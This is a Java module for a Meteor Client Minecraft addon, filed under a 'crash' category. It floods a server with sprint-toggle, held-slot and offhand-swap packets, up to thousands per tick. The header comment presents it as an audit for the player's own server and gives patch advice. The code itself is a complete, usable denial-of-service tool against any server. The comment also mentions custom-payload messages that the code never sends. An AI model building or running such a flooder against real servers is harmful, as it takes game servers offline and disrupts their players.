package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

/**
 * AUDIT: Plugin Channel / Metadata Flood
 *
 * Floods the server with high-volume client-to-server metadata-type packets:
 * sprint-toggle, held-slot, offhand-swap, and custom-payload brand announces.
 * Plugin messaging channels (minecraft:brand, custom plugin channels) are a
 * cheap-to-send but expensive-to-process path that must be rate-limited
 * independently of movement and combat packets.
 *
 * Unlike MetadataFlood (which targets O(viewers) rebroadcast), this module
 * targets the plugin channel handler's processing budget and the Netty inbound
 * queue depth for common metadata messages.
 *
 * Patch signal: apply per-player rate limits to each metadata packet type
 * independently, at the decode stage before plugin handlers run; bound the
 * plugin-message handler's execution time and reject oversized payloads early.
 *
 * Run against your OWN local server only.
 */
public class ChannelFlood extends Module {
    public enum Mode { SPRINT_TOGGLE, HELD_SLOT, OFFHAND_SWAP, ALL }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").description("Which metadata packet(s) to flood.")
        .defaultValue(Mode.ALL).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("per-tick").description("Packets per tick (per type when ALL).")
        .defaultValue(200).range(1, 5000).sliderRange(1, 1000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private boolean sprintState = false;
    private int slotIdx = 0;

    public ChannelFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "channel-flood",
            "Floods sprint-toggle/held-slot/offhand-swap metadata packets. Tests per-type metadata rate limiting.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; sprintState = false; slotIdx = 0; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        for (int i = 0; i < perTick.get(); i++) {
            switch (mode.get()) {
                case SPRINT_TOGGLE -> sendSprintToggle();
                case HELD_SLOT     -> sendHeldSlot();
                case OFFHAND_SWAP  -> sendOffhandSwap();
                case ALL           -> { sendSprintToggle(); sendHeldSlot(); sendOffhandSwap(); }
            }
        }
    }

    private void sendSprintToggle() {
        sprintState = !sprintState;
        mc.player.networkHandler.sendPacket(new ClientCommandC2SPacket(mc.player,
            sprintState ? ClientCommandC2SPacket.Mode.START_SPRINTING
                        : ClientCommandC2SPacket.Mode.STOP_SPRINTING));
            packetsSent++;
    }

    private void sendHeldSlot() {
        slotIdx = (slotIdx + 1) % 9;
        mc.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(slotIdx));
            packetsSent++;
    }

    private void sendOffhandSwap() {
        mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(
            PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
            packetsSent++;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
